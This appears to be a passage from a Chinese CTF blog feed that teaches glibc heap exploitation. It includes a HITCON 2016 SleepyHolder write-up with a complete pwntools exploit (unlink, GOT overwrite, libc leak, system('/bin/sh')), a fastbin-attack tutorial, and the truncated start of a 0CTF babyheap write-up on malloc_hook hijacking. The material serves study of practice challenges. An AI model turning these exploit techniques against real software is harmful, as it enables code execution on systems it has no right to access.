title="修改inuse位"></a>修改inuse位</h4><ol><li>依次<strong>分配small和big</strong>两个secret，然后<strong>释放掉small secret</strong>，small secret将进入fast bin。</li><li>此时再<strong>申请large secret</strong>。由于这是一个large chunk，会先利用malloc_consolidate处理fastbin中的chunk，将能合并的chunk合并后放入unsortedbin，不能合并的就直接放到unsortedbin，这样的目的是减少堆中的碎片。所以<strong>small secret将会进入unsorted bin</strong>，于此同时，big secret的<strong>inuse位也将会被置0</strong>。</li><li>再次<strong>释放small secret</strong>。因为之前释放的small secret已经不在fast bin中，所以此时不会被检测到double free。</li><li>申请small secret。从fast bin中<strong>取回small secret</strong>。这样就达到了修改inuse位的目的</li></ol><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><blockquote><p>前提知识：由于堆块的复用机制，当前一个chunk还在被使用时，后一个chunk的prevsize是归属于前一chunk，作为前一个chunk的数据区域。</p></blockquote><p>程序中，small secret的大小为0x28，刚好可以利用到下一个chunk的prevsize。如下：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x6032e0:0x00000000000000000x0000000000000031 &lt;== small secret</span><br><span class="line">0x6032f0:0x61616161616161610x6161616161616161</span><br><span class="line">0x603300:0x61616161616161610x6161616161616161</span><br><span class="line">0x603310:**0x0a61616161616161**0x0000000000000fb1 &lt;== big secret</span><br><span class="line">0x603320:0x62626262626262620x6262626262626262</span><br><span class="line">0x603330:0x62626262626262620x6262626262626262</span><br><span class="line">0x603340:0x62626262626262620x000000000000000a</span><br></pre></td></tr></table></figure><p></p><p>所以可以通过double free来改变big secret的inuse位，又可以控制big secret的prevsize，且堆指针是全局变量，可以成功实现unlink。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>按照前文方法修改inuse位</li><li>在small secret构造一个fake chunk，并修改big chunk的prevsize</li><li>释放big secret，触发unlink</li><li>通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址</li><li>算出system的地址，并将其写入free_got</li><li>调用free，成功getshell</li></ol><h2 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">'./SleepyHolder'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./SleepyHolder'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'secret: \n'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'2. Big secret\n'</span>)</span><br><span class="line">p.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'2. Big secret\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'secret: \n'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#分配chunk1 chunk2</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#释放chunk1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0</span></span><br><span class="line">add(<span class="number">3</span>, <span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#这时再释放chunk1，让chunk1重新进入fast bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">heap_ptr = <span class="number">0x6020d0</span> <span class="comment">#堆指针</span></span><br><span class="line"><span class="comment">#准备unlink，在chunk1中伪造chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(heap_ptr - <span class="number">0x18</span>) + p64(heap_ptr - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)<span class="comment">#因为内存复用，这里设置chunk2的prev_size</span></span><br><span class="line">add(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#此时chunk2的inuse位是0，所以触发unlink</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">atoi_off = libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink后 堆指针被修改，向现在指针所指内存写入数据</span></span><br><span class="line"><span class="comment">#将chunk2指针覆盖为atoi_got</span></span><br><span class="line"><span class="comment">#将chunk3指针覆盖为puts_got</span></span><br><span class="line"><span class="comment">#将chunk1指针覆盖为free_got</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(atoi_got)</span><br><span class="line">payload += p64(puts_got) + p64(free_got)</span><br><span class="line">update(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#再次向chunk1写入，相当于向free_got写入</span></span><br><span class="line"><span class="comment">#这里将free_got写为puts</span></span><br><span class="line">update(<span class="number">1</span>, p64(puts))</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)</span></span><br><span class="line"><span class="comment">#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址</span></span><br><span class="line"><span class="comment">#由此可计算出libc_base</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>) - atoi_off<span class="comment">#通过调试发现，这里只能取6个字节</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : %#x"</span> % libc_base </span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line"><span class="comment">#将free的got表写为system</span></span><br><span class="line">update(<span class="number">1</span>, p64(system))</span><br><span class="line"><span class="comment">#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数</span></span><br><span class="line">add(<span class="number">2</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder" target="_blank" rel="noopener">SleepyHolder</a><br>exp参考：<a href="https://github.com/mehQQ/public_writeup/blob/master/hitcon2016/SleepyHolder/exp.py" target="_blank" rel="noopener">how2heap</a>、<a href="https://blog.csdn.net/qq_33528164/article/details/80040197" target="_blank" rel="noopener">https://blog.csdn.net/qq_33528164/article/details/80040197</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
            <tag> 堆利用 </tag>
            
            <tag> writeup </tag>
            
            <tag> double_free </tag>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用学习之fastbin attack</title>
      <link href="/post/531412d5.html"/>
      <url>/post/531412d5.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fastbin attack是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。主要利用了fast bin的单链表管理机制。<br><a id="more"></a></p><p><strong>相关源码：</strong><br>malloc：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">    This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">    can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())) &#123;</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">    idx             = fastbin_index(nb);</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr    pp = *fb;</span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p></p><p>这里首先根据所需<strong>chunk的大小</strong>获得该chunk所属<strong>fast bin的index</strong>，根据该index获得所需fast bin的<strong>空闲chunk链表指针</strong>，然后将头指针的下一个chunk（victim-&gt;fd）作为空闲chunk链表的头部（取出头部的chunk）。这里<code>catomic_compare_and_exchange_val_acq</code>是使用了lock-free的技术实现单向链表删除第一个node的操作，暂时不必关注。<br>可以注意到，这里是通过<strong>fd指针</strong>来获取下一个chunk的。所以如果可以控制某个fast bin中chunk的fd指针的值，那么在取出这个chunk后，fd指针指向的内存将会作为下一个将要被取出的内存，再次申请这个大小的内存，也就实现了在<strong>任意地方分配chunk</strong>的目的。</p><p>但是这里需要绕过一个检查:<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存在可以利用的chunk</span></span><br><span class="line"><span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">    <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">    <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">    errout:</span><br><span class="line">        malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>malloc会检查取到的<strong>chunk的size</strong>是否是<strong>符合这个fast bin</strong>的，若是不符合则会GG。所以想要在任意地方分配一个chunk，需要先想办法在此处构造合适的size来通过这个检查。<br>巧妙的是，因为此处没有对内存进行对齐检查，所以可以通过<strong>错位的方式</strong>来构造出一个假的size出来（详见文末相关题目）</p><h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><ul><li>存在堆溢出、UAF等可以控制堆块内容（fd指针）的漏洞</li><li>漏洞发生于fast chunk</li><li>可以在目标位置构造出合适的size来绕过检查</li></ul><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><ol><li>在想要分配的目标内存附近<strong>找到</strong>或者<strong>利用错位</strong>构造一个合适的size，用于绕过检查</li><li>释放掉victim（fast chunk）</li><li>通过从上一个chunk溢出或UAf等方式<strong>修改victim的fd指针</strong>，使fd指针指向构造好size的目标chunk</li><li>通过<strong>两次分配</strong>，得到目标chunk</li></ol><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><a href="/post/47331c36.html">0CTF 2017 babyheap</a></li></ul><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 堆利用学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> fastbin_attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf2017-babyheap writeup</title>
      <link href="/post/47331c36.html"/>
      <url>/post/47331c36.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：0CTF 2017<br>知识点：fastbin attack，chunk overlap<br>题目是一个内存管理系统，能增删查改。<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure><p>题目是64位程序，开启保护情况：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/0ctf2017_babyheap/0ctfbabyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p></p><h2 id="程序概况"><a href="#程序概况" class="headerlink" title="程序概况"></a>程序概况</h2><p><strong>Allocate函数：</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">Allocate</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24L</span>L * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      v2 = get_num();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1u</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24L</span>L * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24L</span>L * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24L</span>L * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Allocate Index %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>限制chunk最大为4096，使用calloc意味着分配时会将chunk中的内容清0。最后将数据存入结构体<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 chunk           struc ; (sizeof=0x18, mappedto_6)</span><br><span class="line">00000000 inuse            dq ?</span><br><span class="line">00000008 length          dq ?</span><br><span class="line">00000010 ptr             dq ?</span><br><span class="line">00000018 chunk           ends</span><br></pre></td></tr></table></figure><p></p><p><strong>Fill函数：</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">Fill</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = get_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24L</span>L * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = get_num();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = sub_11B2(*(_QWORD *)(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>发现此处没有对size进行限制，<strong>存在溢出</strong>。<br>并且，sub_11B2这个读取字符串的函数没有在字符串末尾加上<code>&#39;\x00&#39;</code></p><p><strong>Free函数中</strong>将堆块释放，并将指针清0，没有什么问题。</p><p><strong>dump函数</strong>将指定索引的堆块内容输出</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="泄露libc基址（chunk-overlap）"><a href="#泄露libc基址（chunk-overlap）" class="headerlink" title="泄露libc基址（chunk overlap）"></a>泄露libc基址（chunk overlap）</h3><p>因为在<strong>small bin</strong>中只有一个chunk时，这个chunk的fd和bk将指向libc中某个地址（&amp;main_arena+88）,所以只要能够输出fd或者bk，就能泄露出libc的基址。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x555555757000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 209, </span><br><span class="line">  fd = 0x7ffff7dd37b8 &lt;main_arena+88&gt;,   &lt;== libc中的地址</span><br><span class="line">  bk = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>问题的关键转移到如何输出fd和bk。因为存在堆溢出，那么可以通过从chunk0溢出到chunk1，修改chunk1的size，使size变大从而造成overlap，让chunk2的头部包含在chunk1中，然后就可以通过打印chunk1来泄露libc了</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>先将chunk1释放，通过从chunk0溢出到chunk1的fd，通过控制chunk1的fd，则可以在几乎任意地方分配chunk。因为程序开启PIE和RELRO，所以没办法利用got表，则考虑malloc_hook或者free_hook等。<br>这里需要考虑一个问题，在从fast bin分配chunk时，会检查取到的chunk大小是否与相应的fastbin索引一致（源码如下），也就是说若要在某个地方分配chunk，需要先在这个地方构造好size，使这个size恰好属于chunk所在的fastbin。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line"><span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">    <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">    <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">    errout:</span><br><span class="line">        malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p></p><p>巧妙的是，在malloc_hook的前面，有类似这样的数据:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd3720 &lt;__memalign_hook&gt;:0x00007ffff7a94fc00x0000000000000000</span><br><span class="line">0x7ffff7dd3730 &lt;__realloc_hook&gt;:0x00007ffff7a94f600x0000000000000000</span><br><span class="line">0x7ffff7dd3740 &lt;__malloc_hook&gt;:0x00007ffff7a94f200x0000000000000000</span><br></pre></td></tr></table></figure><p></p><p>又因为这里并没有对齐检测，所以可以通过利用没有对齐的数据来通过检测。通过截取上面数据的<code>7f</code>，和后面的<code>00</code>拼在一起，变成:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd371d:0xfff7a94fc00000000x000000000000007f</span><br><span class="line">0x7ffff7dd372d:0xfff7a94f600000000x000000000000007f</span><br><span class="line">0x7ffff7dd373d:0xfff7a94f200000000x000000000000007f</span><br></pre></td></tr></table></figure><p></p><p>这样就构造出了一个size为<code>0x7f</code>的chunk。这样就可以在这分配一个大小为0x7f的chunk，然后从这写入，覆盖一定的无效数据就能到达malloc_hook的地址，然后向malloc_hook中写入one_gadget就可以getshell了。（了解<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a>）</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>分配两个chunk,大小分别为0x60和0x40（第二个chunk较小是为了之后能够改大，而又不超过fastbin限制）</li><li>从chunk0溢出到chunk1的size，将其改成0x70，使chunk1<strong>覆盖的范围变大</strong>。但此时还并没有真正变大，要释放后重新分配出来才能生效。</li><li><p>再分配两个chunk，chunk2需要是small chunk，chunk3是用来隔开top chunk，防止释放chunk2时被top chunk合并。因为在free的时候会检查下一个chunk的size是否大于2*size_sz并且小于system_mem（源码如下），所以还要在chunk2中构造一个fake size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 